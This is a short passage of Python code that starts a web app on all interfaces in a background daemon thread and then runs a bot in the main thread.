        target=lambda: app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False),
        daemon=True
    )
    t.start()

    # Run the bot (blocks)
    run_bot()